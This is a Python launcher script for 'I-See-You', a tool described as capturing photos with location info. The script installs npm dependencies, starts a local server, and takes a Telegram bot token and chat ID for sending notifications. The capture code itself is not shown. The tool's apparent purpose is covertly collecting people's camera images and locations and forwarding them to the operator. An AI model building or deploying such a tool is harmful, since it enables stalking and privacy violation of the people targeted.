#!/usr/bin/env python3
import os
import sys
import subprocess
import webbrowser
import time
import argparse
from pathlib import Path

# ANSI color codes
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_header():
    header = f"""
{Colors.CYAN}  ####             ## ##   ### ###  ### ###           ##  ##    ## ##   ##  ###
   ##             ##   ##   ##  ##   ##  ##           ##  ##   ##   ##  ##   ##
   ##             ####      ##       ##               ##  ##   ##   ##  ##   ##
   ##              #####    ## ##    ## ##             ## ##   ##   ##  ##   ##
   ##                 ###   ##       ##                 ##     ##   ##  ##   ##
   ##             ##   ##   ##  ##   ##  ##             ##     ##   ##  ##   ##
  ####             ## ##   ### ###  ### ###             ##      ## ##    ## ##

{Colors.END}
{Colors.YELLOW}╔════════════════════════════════════════════════════════════════════╗
║                        >>>  I  S E E  Y O U  <<<                   ║
║                    Capture Photos with Location Info               ║
╚════════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(header)

def check_node_installed():
    try:
        node_version = subprocess.run(['node', '--version'], check=True, capture_output=True, text=True)
        npm_version = subprocess.run(['npm', '--version'], check=True, capture_output=True, text=True)
        print(f"{Colors.GREEN}✓ Node.js {node_version.stdout.strip()} and npm {npm_version.stdout.strip()} detected{Colors.END}")
        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"{Colors.RED}✗ Node.js and npm are required. Please install them from https://nodejs.org/{Colors.END}")
        return False

def install_dependencies():
    print(f"{Colors.BLUE}🔄 Installing dependencies...{Colors.END}")
    try:
        subprocess.run(['npm', 'install'], check=True)
        print(f"{Colors.GREEN}✓ Dependencies installed successfully{Colors.END}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"{Colors.RED}❌ Failed to install dependencies: {e}{Colors.END}")
        return False

def start_server():
    print(f"\n{Colors.CYAN}🚀 Starting I-See-You server...{Colors.END}")
    # Start the server in a non-blocking way
    server_process = subprocess.Popen(
        ['npm', 'run', 'dev'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
        universal_newlines=True
    )
    
    # Wait for server to start
    print("🔄 Waiting for server to start...")
    url = "http://localhost:8080"
    
    # Try to open browser after a short delay
    time.sleep(2)
    print(f"🌐 Opening {url} in your default browser...")
    webbrowser.open(url)
    
    # Print server output
    print("\n=== Server Output (Ctrl+C to stop) ===")
    try:
        for line in server_process.stdout:
            print(line, end='')
    except KeyboardInterrupt:
        print("\n🛑 Stopping server...")
        server_process.terminate()
        sys.exit(0)

def parse_arguments():
    parser = argparse.ArgumentParser(description='I-See-You - Capture Photos with Location Info')
    parser.add_argument('--bot-token', help='Telegram Bot Token')
    parser.add_argument('--chat-id', help='Telegram Chat ID')
    return parser.parse_args()

def main():
    args = parse_arguments()
    
    # Set environment variables if provided
    if args.bot_token:
        os.environ['TELEGRAM_BOT_TOKEN'] = args.bot_token
    if args.chat_id:
        os.environ['TELEGRAM_CHAT_ID'] = args.chat_id
    
    print("🔍 Checking system requirements...")
    if not check_node_installed():
        print("❌ Node.js and npm are required. Please install them from https://nodejs.org/")
        sys.exit(1)
    
    # Check if node_modules exists, if not install dependencies
    if not (Path(__file__).parent / 'node_modules').exists():
        if not install_dependencies():
            sys.exit(1)
    
    # Show Telegram configuration status
    if 'TELEGRAM_BOT_TOKEN' in os.environ and 'TELEGRAM_CHAT_ID' in os.environ:
        print(f"{Colors.GREEN}✓ Telegram bot configured successfully{Colors.END}")
    else:
        print(f"{Colors.YELLOW}⚠  Telegram bot not configured. To enable Telegram notifications, run with --bot-token and --chat-id{Colors.END}")
    
    start_server()

if __name__ == "__main__":
    print_header()
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Exiting I-See-You...{Colors.END}")
        sys.exit(0)
